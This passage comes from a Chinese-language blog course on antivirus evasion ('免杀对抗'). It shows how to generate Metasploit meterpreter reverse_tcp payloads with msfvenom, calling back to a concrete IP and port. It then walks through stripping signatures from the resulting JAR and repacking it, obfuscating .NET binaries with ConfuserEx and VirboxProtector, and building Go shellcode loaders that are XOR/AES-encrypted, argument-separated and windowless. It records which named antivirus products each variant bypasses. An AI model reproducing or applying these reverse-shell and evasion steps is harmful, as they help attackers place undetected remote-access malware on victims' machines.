exec;</p><p>​    }</p><p>​    return 0;</p><p>}</p><h3 id="JAVA-ShellCode-源码修改-amp-打包EXE-MSF（不是很实用）"><a href="#JAVA-ShellCode-源码修改-amp-打包EXE-MSF（不是很实用）" class="headerlink" title="#JAVA-ShellCode-源码修改&amp;打包EXE-MSF（不是很实用）"></a>#JAVA-ShellCode-源码修改&amp;打包EXE-MSF（不是很实用）</h3><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504093126658.png" alt="image-20230504093126658"></p><h5 id="1、JAR包源码特征修改免杀（对方有java环境）"><a href="#1、JAR包源码特征修改免杀（对方有java环境）" class="headerlink" title="1、JAR包源码特征修改免杀（对方有java环境）"></a>1、JAR包源码特征修改免杀（对方有java环境）</h5><ul><li><p>msf生成jar包：</p><p> msfvenom -p java&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;x.x.x.x LPORT&#x3D;xxxx -f jar -o msf.jar </p></li><li><p>-Jar反编译导出-jdgui</p></li><li><p>-修改上线配置-config</p></li><li><p>-修改启动主类-MANIFEST.MF</p></li><li><p>-修改执行代码-Main.java</p></li><li><p>-打包class-javac Main.java</p></li><li><p>-编译jar-jar cvfm xiaodi.jar META-INF&#x2F;MANIFEST.MF .</p></li></ul><h6 id="反编译后导出"><a href="#反编译后导出" class="headerlink" title="反编译后导出"></a>反编译后导出</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504102810833.png" alt="image-20230504102810833"></p><h6 id="把这些敏感文件名修改，将metasploit-dat改为config，将metasploit里面的payload-java剪切到根目录，改名为Main-java，并删除metasploit目录"><a href="#把这些敏感文件名修改，将metasploit-dat改为config，将metasploit里面的payload-java剪切到根目录，改名为Main-java，并删除metasploit目录" class="headerlink" title="把这些敏感文件名修改，将metasploit.dat改为config，将metasploit里面的payload.java剪切到根目录，改名为Main.java，并删除metasploit目录"></a>把这些敏感文件名修改，将metasploit.dat改为config，将metasploit里面的payload.java剪切到根目录，改名为Main.java，并删除metasploit目录</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504103042498.png" alt="image-20230504103042498"></p><h6 id="将原来的MANTFEST-MF的内容文件名对应也要修改"><a href="#将原来的MANTFEST-MF的内容文件名对应也要修改" class="headerlink" title="将原来的MANTFEST.MF的内容文件名对应也要修改"></a>将原来的MANTFEST.MF的内容文件名对应也要修改</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504103322448.png" alt="image-20230504103322448"></p><h6 id="修改成"><a href="#修改成" class="headerlink" title="修改成"></a>修改成</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504103517868.png" alt="image-20230504103517868"></p><h6 id="也可以修改成"><a href="#也可以修改成" class="headerlink" title="也可以修改成"></a>也可以修改成</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504103613464.png" alt="image-20230504103613464"></p><h6 id="原来代码里面，str4是从metasploit-dat里面获取的ip地址，j是从metasploit-dat获取端口，由于将从metasploit-dat删了，所以在代码里面定义"><a href="#原来代码里面，str4是从metasploit-dat里面获取的ip地址，j是从metasploit-dat获取端口，由于将从metasploit-dat删了，所以在代码里面定义" class="headerlink" title="原来代码里面，str4是从metasploit.dat里面获取的ip地址，j是从metasploit.dat获取端口，由于将从metasploit.dat删了，所以在代码里面定义"></a>原来代码里面，str4是从metasploit.dat里面获取的ip地址，j是从metasploit.dat获取端口，由于将从metasploit.dat删了，所以在代码里面定义</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504103717412.png" alt="image-20230504103717412"></p><h6 id="进行修改后"><a href="#进行修改后" class="headerlink" title="进行修改后"></a>进行修改后</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504103907864.png" alt="image-20230504103907864"></p><h6 id="最后一共有如下文件"><a href="#最后一共有如下文件" class="headerlink" title="最后一共有如下文件"></a>最后一共有如下文件</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504104123446.png" alt="image-20230504104123446"></p><h6 id="打包成class"><a href="#打包成class" class="headerlink" title="打包成class"></a>打包成class</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504104112070.png" alt="image-20230504104112070"></p><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504104200072.png" alt="image-20230504104200072"></p><h6 id="打包成jar文件（实现了通杀）"><a href="#打包成jar文件（实现了通杀）" class="headerlink" title="打包成jar文件（实现了通杀）"></a>打包成jar文件（实现了通杀）</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504104304582.png" alt="image-20230504104304582"></p><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504104327570.png" alt="image-20230504104327570"></p><h5 id="2、JAR包打包EXE执行免杀（对方无java环境，不推荐使用）"><a href="#2、JAR包打包EXE执行免杀（对方无java环境，不推荐使用）" class="headerlink" title="2、JAR包打包EXE执行免杀（对方无java环境，不推荐使用）"></a>2、JAR包打包EXE执行免杀（对方无java环境，不推荐使用）</h5><p>安装：exe4j Inno进行打包</p><p>exe4j-下载链接：<a href="https://exe4j.apponic.com/">https://exe4j.apponic.com/</a></p><p>inno-下载链接：<a href="https://jrsoftware.org/isdl.php">https://jrsoftware.org/isdl.php</a></p><p>操作说明：<a href="https://www.jb51.net/article/236000.htm">Java jar打包成exe应用程序的详细步骤_java_脚本之家 (jb51.net)</a></p><h6 id="生成exe文件后不用马上打开，因为在没有java环境下仍然运行不了"><a href="#生成exe文件后不用马上打开，因为在没有java环境下仍然运行不了" class="headerlink" title="生成exe文件后不用马上打开，因为在没有java环境下仍然运行不了"></a>生成exe文件后不用马上打开，因为在没有java环境下仍然运行不了</h6><p><img src="/../images/Day111-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-Java-ASM-%E6%B1%87%E7%BC%96CS%E8%B0%83%E7%94%A8-%E5%86%85%E8%81%94C-MSF%E6%BA%90%E7%A0%81%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9-Jar%E6%89%93%E5%8C%85/image-20230504112239696.png" alt="image-20230504112239696"></p><h6 id="照着上面的操作说明一步步完成（复杂，太拉了，生成了几十MB的exe文件，免杀效果还不好）"><a href="#照着上面的操作说明一步步完成（复杂，太拉了，生成了几十MB的exe文件，免杀效果还不好）" class="headerlink" title="照着上面的操作说明一步步完成（复杂，太拉了，生成了几十MB的exe文件，免杀效果还不好）"></a>照着上面的操作说明一步步完成（复杂，太拉了，生成了几十MB的exe文件，免杀效果还不好）</h6>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Day110 免杀对抗-GO&amp;C#&amp;反VT沙盒&amp;逆向调试&amp;参数加载&amp;资源分离&amp;混淆加密</title>
      <link href="/2023/04/27/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/"/>
      <url>/2023/04/27/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/8TLUjSoX6pXaftunKDWHlw.png" alt="img"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、C#-混淆&amp;分离&amp;反调试</p><p>2、GO-混淆&amp;分离&amp;反调试</p><p>3、成品程序-包含反调试VT</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>编译代码面-ShellCode-混淆</p><p>编译代码面-编辑执行器-编写</p><p>编译代码面-分离加载器-编写</p><p>程序文件面-特征码定位-修改</p><p>程序文件面-加壳花指令-资源</p><p>代码加载面-Dll反射劫持-加载</p><p>权限逻辑面-杀毒进程干扰-结束</p><p>工具数据面-通讯内存流量-动态</p><h5 id="对抗目标："><a href="#对抗目标：" class="headerlink" title="对抗目标："></a>对抗目标：</h5><p>X60 Defender 某绒 管家 VT等</p><h5 id="编程语言："><a href="#编程语言：" class="headerlink" title="编程语言："></a>编程语言：</h5><p>C&#x2F;C++  Python C# Go Powershell Ruby Java ASM等</p><h5 id="涉及技术："><a href="#涉及技术：" class="headerlink" title="涉及技术："></a>涉及技术：</h5><p>ShellCode混淆加密，无文件落地，分离拆分，白名单，DLL加载，Syscall，加壳加花，</p><p>资源修改，特征修改，二次开发CS，内存休眠，进程注入，反沙盒，反调试，CDN解析等</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="➢-C-amp-NET-ShellCode-原型-amp-混淆"><a href="#➢-C-amp-NET-ShellCode-原型-amp-混淆" class="headerlink" title="➢ C#&amp;NET-ShellCode-原型&amp;混淆"></a>➢ C#&amp;NET-ShellCode-原型&amp;混淆</h4><h4 id="➢-GO-ShellCode-原型-amp-混淆-amp-分离"><a href="#➢-GO-ShellCode-原型-amp-混淆-amp-分离" class="headerlink" title="➢ GO-ShellCode-原型&amp;混淆&amp;分离"></a>➢ GO-ShellCode-原型&amp;混淆&amp;分离</h4><h4 id="➢-C-amp-GO-成品程序-保护反调试VT"><a href="#➢-C-amp-GO-成品程序-保护反调试VT" class="headerlink" title="➢ C#&amp;GO-成品程序-保护反调试VT"></a>➢ C#&amp;GO-成品程序-保护反调试VT</h4></blockquote><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502162648112.png" alt="image-20230502162648112"></p><h3 id="C-NET"><a href="#C-NET" class="headerlink" title="C# .NET"></a>C# .NET</h3><h5 id="1、原型"><a href="#1、原型" class="headerlink" title="1、原型"></a>1、原型</h5><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;47.94.236.117 LPORT&#x3D;6688 -e x86&#x2F;shikata_ga_nai -i 15 -f csharp</p><h5 id="2、混淆"><a href="#2、混淆" class="headerlink" title="2、混淆"></a>2、混淆</h5><p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;47.94.236.117 LPORT&#x3D;6688 -f csharp</p><h5 id="3、文件混淆-反调试VT"><a href="#3、文件混淆-反调试VT" class="headerlink" title="3、文件混淆-反调试VT"></a>3、文件混淆-反调试VT</h5><ul><li><p>开源-ConfuserEx</p></li><li><p>付费-VirboxProtector</p></li></ul><h5 id="（1）ConfuserEx："><a href="#（1）ConfuserEx：" class="headerlink" title="（1）ConfuserEx："></a>（1）ConfuserEx：</h5><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502152311788.png" alt="image-20230502152311788"></p><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502152529723.png" alt="image-20230502152529723"></p><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502152611614.png" alt="image-20230502152611614"></p><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502152720041.png" alt="image-20230502152720041"></p><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502152757109.png" alt="image-20230502152757109"></p><h6 id="会在protected目录生成新的exe文件"><a href="#会在protected目录生成新的exe文件" class="headerlink" title="会在protected目录生成新的exe文件"></a>会在protected目录生成新的exe文件</h6><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502153139446.png" alt="image-20230502153139446"></p><h6 id="还是能够反编译，但是出现了很多的未知代码，将这个文件放到DF和x绒上都可以过，过不了x60"><a href="#还是能够反编译，但是出现了很多的未知代码，将这个文件放到DF和x绒上都可以过，过不了x60" class="headerlink" title="还是能够反编译，但是出现了很多的未知代码，将这个文件放到DF和x绒上都可以过，过不了x60"></a>还是能够反编译，但是出现了很多的未知代码，将这个文件放到DF和x绒上都可以过，过不了x60</h6><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502153219146.png" alt="image-20230502153219146"></p><h5 id="（2）VirboxProtector"><a href="#（2）VirboxProtector" class="headerlink" title="（2）VirboxProtector"></a>（2）VirboxProtector</h5><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502153444891.png" alt="image-20230502153444891"></p><h6 id="这里全过了"><a href="#这里全过了" class="headerlink" title="这里全过了"></a>这里全过了</h6><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502154604408.png" alt="image-20230502154604408"></p><h3 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h3><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502163949520.png" alt="image-20230502163949520"></p><h5 id="运行1-go脚本"><a href="#运行1-go脚本" class="headerlink" title="-运行1.go脚本"></a>-运行1.go脚本</h5><p>go run 1.go</p><p>cs生成payload.c</p><p>将”\“换成””,0”替换成bit流数据</p><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502160731008.png" alt="image-20230502160731008"></p><p>替换到1.go的shellcode处</p><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502164222199.png" alt="image-20230502164222199"></p><h5 id="编译1-go脚本"><a href="#编译1-go脚本" class="headerlink" title="-编译1.go脚本"></a>-编译1.go脚本</h5><p>go build 1.go（执行即可上线）</p><h5 id="没有弹窗的exe命令编译："><a href="#没有弹窗的exe命令编译：" class="headerlink" title="-没有弹窗的exe命令编译："></a>-没有弹窗的exe命令编译：</h5><p>go build -ldflags&#x3D;”-H windowsgui -w -s” 1.go （生成exe文件）</p><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502162319857.png" alt="image-20230502162319857"></p><h5 id="1、Golang-Shellcode编译-1-go"><a href="#1、Golang-Shellcode编译-1-go" class="headerlink" title="1、Golang-Shellcode编译-1.go"></a>1、Golang-Shellcode编译-1.go</h5><h5 id="2、Golang-编码加密-Xor-amp-Aes混淆-2-amp-3-go（只过DF）"><a href="#2、Golang-编码加密-Xor-amp-Aes混淆-2-amp-3-go（只过DF）" class="headerlink" title="2、Golang-编码加密-Xor&amp;Aes混淆-2&amp;3.go（只过DF）"></a>2、Golang-编码加密-Xor&amp;Aes混淆-2&amp;3.go（只过DF）</h5><p>Xor Aes Base64 参数提交</p><p>演示AES加密参数提交：</p><h6 id="3-go是本地加密shellcode的文件"><a href="#3-go是本地加密shellcode的文件" class="headerlink" title="3.go是本地加密shellcode的文件"></a>3.go是本地加密shellcode的文件</h6><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502175651749.png" alt="image-20230502175651749"></p><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502175747795.png" alt="image-20230502175747795"></p><h6 id="3-1-go是解密的脚本，即执行shellcode的脚本，这里要传入上面的key和code值"><a href="#3-1-go是解密的脚本，即执行shellcode的脚本，这里要传入上面的key和code值" class="headerlink" title="3.1.go是解密的脚本，即执行shellcode的脚本，这里要传入上面的key和code值"></a>3.1.go是解密的脚本，即执行shellcode的脚本，这里要传入上面的key和code值</h6><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502180154517.png" alt="image-20230502180154517"></p><h6 id="执行命令生成exe文件"><a href="#执行命令生成exe文件" class="headerlink" title="执行命令生成exe文件"></a>执行命令生成exe文件</h6><p><strong><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502180306962.png" alt="image-20230502180306962"></strong></p><h6 id="生成exe文件，执行的时候仍然需要带上参数key和code，exe文件只有解密的功能，恶意代码作为code参数分离上传"><a href="#生成exe文件，执行的时候仍然需要带上参数key和code，exe文件只有解密的功能，恶意代码作为code参数分离上传" class="headerlink" title="生成exe文件，执行的时候仍然需要带上参数key和code，exe文件只有解密的功能，恶意代码作为code参数分离上传"></a>生成exe文件，执行的时候仍然需要带上参数key和code，exe文件只有解密的功能，恶意代码作为code参数分离上传</h6><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502180503650.png" alt="image-20230502180503650"></p><h5 id="3、Golang-分离式加载器-参数-amp-资源-4-amp-5-go"><a href="#3、Golang-分离式加载器-参数-amp-资源-4-amp-5-go" class="headerlink" title="3、Golang-分离式加载器-参数&amp;资源-4&amp;5.go"></a>3、Golang-分离式加载器-参数&amp;资源-4&amp;5.go</h5><p>加上去特征&amp;参数分离</p><h6 id="4-go-cs或msf生成raw格式"><a href="#4-go-cs或msf生成raw格式" class="headerlink" title="4.go:  cs或msf生成raw格式"></a>4.go:  cs或msf生成raw格式</h6><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502201440785.png" alt="image-20230502201440785"></p><h6 id="5-go-过DF、x绒"><a href="#5-go-过DF、x绒" class="headerlink" title="5.go:(过DF、x绒)"></a>5.go:(过DF、x绒)</h6><h6 id="msfvenom-p-windows-x2F-x64-x2F-meterpreter-x2F-reverse-tcp-LHOST-x3D-47-94-236-117-LPORT-x3D-6688-f-hex"><a href="#msfvenom-p-windows-x2F-x64-x2F-meterpreter-x2F-reverse-tcp-LHOST-x3D-47-94-236-117-LPORT-x3D-6688-f-hex" class="headerlink" title="msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;47.94.236.117 LPORT&#x3D;6688 -f hex"></a>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;47.94.236.117 LPORT&#x3D;6688 -f hex</h6><p><img src="/../images/Day110-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-GO-C-%E5%8F%8DVT%E6%B2%99%E7%9B%92-%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95-%E5%8F%82%E6%95%B0%E5%8A%A0%E8%BD%BD-%E8%B5%84%E6%BA%90%E5%88%86%E7%A6%BB-%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/image-20230502195050720.png" 